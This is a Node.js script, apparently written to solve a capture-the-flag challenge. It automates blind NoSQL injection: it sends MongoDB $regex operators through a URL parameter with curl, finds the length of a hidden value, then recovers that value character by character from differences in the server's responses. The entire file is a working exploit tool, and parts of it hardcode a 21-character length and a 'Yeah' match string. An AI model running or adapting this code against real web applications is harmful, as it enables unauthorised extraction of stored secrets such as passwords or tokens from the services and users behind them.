#!/usr/local/bin/node
const {execFile} = require('child_process')
const args = require('yargs')
  .usage('Usage: $0 -u [url] -p [injectableParam] -w [winString] -t <timeout> -l <debug|info|error>')
  .alias('u', 'url')
  .alias('p', 'param')
  .alias('w', 'win')
  .alias('t', 'timeout')
  .alias('l', 'level')
  .demandOption(['u', 'p', 'w'])
  .argv

const TIMEOUT = args.timeout || 200
const chars = "cjnqsyCJNQSY01357_Œ°+^$ù*;:!,\"'<>~#{[|`\\^@]}ê³~"
const logLevel = args.level === 'debug' ? 3 : (
    args.level === 'info' ? 2 : (
      args.level === 'error' ? 1 : 3))

function success () {
  let args = Array.from(arguments)
  args.unshift('>')
  console.log.apply({}, args)
}

function info () {
  if (logLevel < 2) return
  let args = Array.from(arguments)
  args.unshift('[+]')
  console.log.apply({}, args)
}

function debug () {
  if (logLevel < 3) return
  let args = Array.from(arguments)
  args.unshift('[-]')
  console.log.apply({}, args)
}

function error () {
  let args = Array.from(arguments)
  args.unshift('[!]')
  console.error.apply({}, args)
}

function esc (chr, clean) {
  let c = '.^$*+?()[{\\|'.indexOf(chr) !== -1 ? '\\' + chr : chr
  return clean ? c : encodeURIComponent(c)
}

function regexParam (param) {
  return param + '[$regex]='
}

function findLength (url, param, good, length) {
  length = length || 1
  debug('trying with', length, 'characters')
  return new Promise((resolve, reject) => {
    let lguess = url + '&' + regexParam(param) + '^.{' + length + '}$'

    execFile('/usr/bin/curl', ['-g', lguess], (err, stdout, stderr) => {
      if (err) return reject(err)
      if (stdout.indexOf(good) !== -1) {
        info(param, 'is', length, 'char long')
        return resolve(length)
      }
      setTimeout(function () {
        reject(false)
      }, TIMEOUT)
    })
  })
  .catch((err) => {
    if (!err) {
      return findLength(url, param, good, length + 1)
    }
    throw err
  })
}

function alreadyFoundChars (found, length, clean) {
  let param = ''
  for (let i = 1; i < length; i++) {
    param += esc(found[i], clean)
  }
  return param
}

function findChars (url, param, good, length, loc, i, found) {
  loc = loc || 1
  i = i || 0
  found = found || []
  debug('Trying with ', alreadyFoundChars(found, loc, true) + chars[i])

  return new Promise((resolve, reject) => {
    let params = '&' + regexParam(param) + alreadyFoundChars(found, loc)

    params += esc(chars[i]) + '.{' + (21 - loc) + '}$&flag[$options]=s'

    execFile('/usr/bin/curl', ['-g', url + params], (error, stdout, stderr) => {
      if (error) return reject(error)

      if (stdout.indexOf('Yeah') !== -1) {
        info('The', loc + 'nth char is', chars[i])
        found[loc] = chars[i]

        if (loc === 21) {
          return resolve(found.join(''))
        }
        i = 0
        loc++
        return reject(false)
      }

      if (i < chars.length - 1) {
        i++
      } else if (loc < 21) {
        i = 0
        loc++
      }
      setTimeout(() => {
        reject(false)
      }, TIMEOUT)
    })
  })
  .catch((err) => {
    if (err === false) {
      return findChars(url, param, good, length, loc, i, found)
    }
    throw err
  })
}

Promise.resolve()
.then(() => {
  info('Trying to find the flag length...')
  return findLength(args.url, args.param, args.win)
})
.then((length) => {
  info('Trying to find the flag content')
  return findChars(args.url, args.param, args.win, length)
})
.then((soluce) => {
  success('param', args.param, 'is', soluce)
})
.catch((err) => {
  error(err)
})
